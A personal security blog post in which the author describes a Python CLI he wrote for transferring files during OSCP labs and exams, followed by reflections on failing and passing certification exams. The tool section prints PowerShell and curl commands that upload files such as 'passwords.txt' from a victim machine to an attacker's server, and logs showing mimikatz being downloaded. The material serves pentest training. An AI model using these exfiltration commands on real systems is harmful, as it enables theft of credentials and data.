---
title: "Writing Tools and Learning"
date: 2025-01-19
---

## Intro

When I started my career in security, getting the OSCP certification was one of my first goals. Unfortunately, I failed my first attempt. A bit over four years later, I retook the exam and passed. The journey between attempts was not as linear as I had imagined and it has taken me some time to finally write out some of my thoughts on the process.

Before reflecting, I want to share a simple tool I wrote to help me during the exam. I understand that this is a small, personal, and sporadic blog, but I think of it as a way to look back on my previous lines of thinking. Additionally, if something here helps even just one person on a similar journey, that would be a great accomplishment for me. 

## Transferring Files

Throughout the OSCP curriculum, a recurring scenario is the need to transfer files between machines. This could be for initial foothold payloads, privilege escalation scripts, and exfiltrating documents for analysis (or dumping secrets!). Offsec's learning materials show a few different ways to accomplish this task through SMB, FTP, or HTTP. There are also many other ways to accomplish this task. While reading a post on The DFIR Report ([here](https://thedfirreport.com/2024/10/28/inside-the-open-directory-of-the-you-dun-threat-group/)) describing a threat actor's open directory, I realized how much easier it would be to have an always-on http server to pull tooling from when needed. Also, it is important to avoid fiddling around and learning new tooling during a certification exam when time is a resource and also a source of anxiety.

Like many others, I initially started out using Python's built-in http server module. However, I continuously found that I needed to upload files from victim machines to the attack machine. I started using [goshs](https://github.com/patrickhener/goshs), (which is an amazing tool and has now been added to the kali repos,) but I wanted an easy way to upload files straight from a command line. (I believe this is possible since there is a GUI for uploads but I did not look too deep into this.) Also, after a few months of grinding machines on Vulnhub and Proving Grounds, I had accumulated a long list of scripts and tools for pentesting that became a pain to look through every time I needed something. My idea was to write a  command line tool to search through my folder of tools and spit out a command to run on a victim machine. It is definitely possible that someone has already solved this problem but I figured I should get some scripting exercise in and build something from the ground up. 

# What it does

Github: [hosting](https://github.com/ky2303/hosting)

Since you are usually on Offsec's VPN when doing the labs or exam, the script uses the IP address of `tun0` and the default port 8000 from Python's module. This can be changed with arguments. There are four commands to use in the tool: download, logs, search, upload. They all have single letter aliases (d, l, s, u). While testing and writing the tool, I ended up integrating of the `download` functionality into the `search` function. As a result, I almost never use the `download` function and will most likely remove it going forward.

Demo:

```bash
$ python3 hosting.py -p 80
VPN: ON
IP : 192.168.61.128
HTTP server started at http://localhost:80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Welcome to the file search CLI. Type help or ? to list commands.
>> 
```

![search]({{ "../assets/2025-01-19-writing-tools/search.png" | relative_url }})

![download]({{ "../assets/2025-01-19-writing-tools/download.png" | relative_url }})


# Commands

**Logs:** Since the tool runs the HTTP server and CLI modules together, output became a bit messy, so I decided to log everything from the server module to a file. This file can be shown by using `logs`. It will display the last 5 lines in the log file unless given an integer as an argument. The log file is deleted when exiting the CLI unless the `-l` argument is set to `True` when starting.

```bash
>> logs
2025-01-19 11:25:23,239 - "GET /mimikatz/x64/mimikatz.exe HTTP/1.1" 200 -
2025-01-19 11:26:42,177 - "GET /mimikatz/x64/mimikatz.exe HTTP/1.1" 200 -
```

**Search:** This function searches the hosted directory for a filename given as an argument. If a match is found, it shows both linux and windows commands to download the file, making it easy to copy/paste commands. This was the main usecase I had in mind for this tool and I think it came out great. I use it a lot.


**Upload:** Continuing with the theme of easy copy/pasting, this function just spits out linux and windows commands to upload files to the machine where this script is hosted. The http server class had to be extended a bit to add this functionality, but someone had already solved this problem so I copied [their code](https://gist.github.com/darkr4y/761d7536100d2124f5d0db36d4890109) for this part. I did run into some issues with files that were too large. (See Future.)

```bash
>> uploads passwords.txt
[*] Win upload command:
powershell -ep bypass -c "(New-Object Net.WebClient).UploadFile('http://192.168.61.128:80/passwords.txt', 'PUT', 'passwords.txt');"
[*] Linux upload commands:
curl -X PUT -T "passwords.txt" "http://192.168.61.128:80/passwords.txt"
```

# Future 

I recently came across a talk given by Tom Hudson that I enjoyed. I first heard of Tom (aka Tomnomnom) while listening to the Critical Thinking Bug Bounty podcast with Justin Gardner (aka rhynorater). In the talk, Tom shares a few great points about writing tools. I think Tom's idea of making simple tools that do one thing well is great and plan to continue iterating with this in mind.

The talk can be found here:

[Confessions of a Toolmaker - Tom Hudson](https://www.youtube.com/watch?v=lFBAo9TKRY8)

I also would like to fix the issue with larger files when sending PUT requests. I did not look into this closely but when I came across the problem, I used the `download` function in Evil-WinRM on windows machines or `scp` on linux. 


## Reflections

Back to my thoughts on the certification process. After failing my first exam attempt, I realized that I was way too overconfident. I had crested the initial peak of the Dunning-Kruger curve.

![dunning_kreuger]({{ "../assets/2025-01-19-writing-tools/dunning-kreuger.png" | relative_url }}){:style="display:block; margin-left:auto; margin-right:auto"}

As I took a step back, I realized how many fundamental concepts I did not fully grasp. I did not give the labs as much time and thought as I should have and I quickly skimmed through the PDF that OffSec gives you. While this approach may have worked in the tests I took in former academic environments, it was inadequate for a practical exam in a simulated environment. Unfortunately, I needed a job so I decided to shelf the idea of getting the OSCP and hammered out some entry-level CompTIA certs to get past the HR filters. 

Fast-forward to mid-2024, I had been comfortably working in a security role for about two years, participated in a few more CTFs, and completed almost every list of OSCP-like machines on Vulnhub that I could find. I decided to get the Learn-One subscription to OffSec which comes with the OSCP curriculum, access to a lot more practice machines, and two exam attempts. I scheduled my exam for September and started studying. 

Then, at the end of August, OffSec announced that they were changing the exam again to an "assumed compromise"-type exam, removing the bonus points for doing labs, and creating an "OSCP+" certification that expires every 3 years. This was about three weeks before my scheduled exam date, but it would not take effect until November. I thought about what to do for a few days but ultimately decided that since the original certification did not expire and I had already put many hours into doing the labs to get bonus points, it was best to stick to my original plan and take the exam in September. Thankfully, I passed and the bonus points helped. 

I now had the decision on whether I should use my second exam attempt on the wireless pentesting exam (OWSP) or try the OSCP+. Around this time, I realized that the pressure and anxiety that I put on myself to pass the exam had caused some health issues so I decided to take a little break from studying. After about a month of rest, I started doing Proving Grounds machines on OffSec again and decided to attempt the OSCP+ right after the holidays. What a terrible idea.

Unfortunately, I did not pass the OSCP+ exam. In the few days after, I was devastated and thought less of myself, constantly going over different enumeration methods and attacks I may have missed in my head. The feeling of failure after my first attempt returned, and I felt that I had crested another peak in another Dunning-Kruger curve. This is when I realized my own curve looked something like this:

![dunning_kreuger]({{ "../assets/2025-01-19-writing-tools/dunning-kreuger-modified.png" | relative_url }}){:style="display:block; margin-left:auto; margin-right:auto"}

(Apoloigies for the quality. Graphic design is not my passion)

After some time and reflection, I figured that I had accomplished the original goal I set for myself when I first started out this journey. Even with the failures, I learned new things -- in security and about myself -- that made the input time valuable. Two things have helped me cope with low times for me career-wise. First, after the Denver Nuggets won their first NBA championship in franchise history in 2023, center Nikola Jokic had one of my favorite recent quotes:

![jokic]({{ "../assets/2025-01-19-writing-tools/jokic.jpg" | relative_url }}){:style="display:block; width:600px"}

Secondly, a practical exercise that I recently started. Another podcast I enjoy is "My First Million" with Sam Parr and Shaan Puri. In a recent episode, Puri talks about a personal Slack channel he has called "Highs and Lows". In this channel, he writes down the most emotional moments while running his businesses. When an extreme event happens, whether good or bad, Puri will write down the event in the channel, overtime creating a log of times to look back on and see how far you have come. I have started to do this in my own way by writing down these types of events for my own career (though not in a Slack channel). Doing this has been helpful, and my hope is that in the long-term it will help me smooth out my own modified Dunning-Kruger curve above, balancing emotions with confidence and competence. The last mention of Puri's "Highs and Lows" channel is at the 46:29 mark here: [MFM youtube](https://youtu.be/8yIrBHghAJE?si=XtSmc9IEeMfq-jTA&t=2789)
